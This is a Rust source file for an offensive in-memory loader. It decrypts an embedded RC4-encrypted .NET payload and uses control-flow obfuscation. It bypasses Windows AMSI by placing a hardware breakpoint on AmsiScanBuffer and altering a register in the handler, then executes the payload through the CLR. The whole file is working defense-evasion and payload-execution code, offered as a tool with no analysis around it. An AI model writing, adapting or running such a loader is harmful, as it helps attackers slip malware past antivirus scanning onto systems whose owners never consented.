use std::error::{self, Error};

use clroxide::clr::Clr;
use crypto::symmetriccipher::SynchronousStreamCipher;
use dinvk::{GetModuleHandle, GetProcAddress};
use hwbp::windows::CONTEXT;
use hwbp::{Condition, Context, ContextError, Size, HWBP};
use libloading::Library;
use zeroize::Zeroize;

fn hooked_method(ctx: &mut CONTEXT) {
    println!("[+] Breakpoint has been triggered\n");
    ctx.Rcx += 27;
}

fn main() -> Result<(), Box<dyn std::error::Error>> {
    hwbp::init();

    // Collect Arguments
    let mut _args: Vec<String> = std::env::args().collect();
    _args.drain(0..1);
    let args: Vec<String> = _args.iter().map(|s| s.to_string()).collect();

    let buffer = include_bytes!("encr");

    // Decrypt the payload
    let mut cipher = crypto::rc4::Rc4::new(include_bytes!("../keyfile"));
    let mut o = buffer.clone();
    o.zeroize();
    cipher.process(&buffer[..], &mut o);

    cryptify::flow_stmt!();
    let mut clr = Clr::new(o.to_vec(), args)?;

    // Step 1. Load amsi.dll into the process
    let lib = unsafe { Library::new("C:\\Windows\\System32\\amsi.dll").expect("Shit") };
    let mut ctx = Context::current().unwrap();
    let mut hwbp = amsi_bypass(ctx)?;

    // Run the dotnet exe
    let results = clr.run();
    match results {
        Ok(res) => println!("[*] Results:\n\n{}", res),
        Err(e) => return Err(e.into())
    }
    
    // Zero Buffer
    o.zeroize();

    // Restore Breakpoint
    hwbp.disable();
    ctx.set(&hwbp);
    ctx.apply_for_current_thread().expect("Failed to apply");
    hwbp::free();

    // Cleanup
    let _ = lib.close();
    Ok(())
}




fn amsi_bypass(mut ctx: hwbp::Context) -> Result<(HWBP), ContextError> {
    /////////////////////////////////////////////////////////////
    // AMSI Bypass
    /////////////////////////////////////////////////////////////

    // Step 2. Get the address of the `AmsiScanbuffer`
    let amsi_dll = GetModuleHandle("amsi.dll", None);
    let addr = GetProcAddress(amsi_dll, "AmsiScanBuffer", None);
    println!(
        "[!] Found AMSI.DLL: {:?} \n[!] AmsiScanBuffer address: {:?}",
        amsi_dll, addr
    );

    let mut hwbp = ctx
        .unused()
        .unwrap()
        .watch_memory_execute(addr as _, hooked_method)
        .with_enabled(true)
        .with_condition(Condition::Execute)
        .build_and_set()
        .expect("Failed");

    match ctx.apply_for_current_thread() {
        Ok(_) => {
            println!("[+] Hardware Breakpoint has been applied");
            Ok(hwbp)
        }
        Err(e) => {
            eprintln!("[x] Failed with error: {e}");
            Err(e)
        }
    }
}
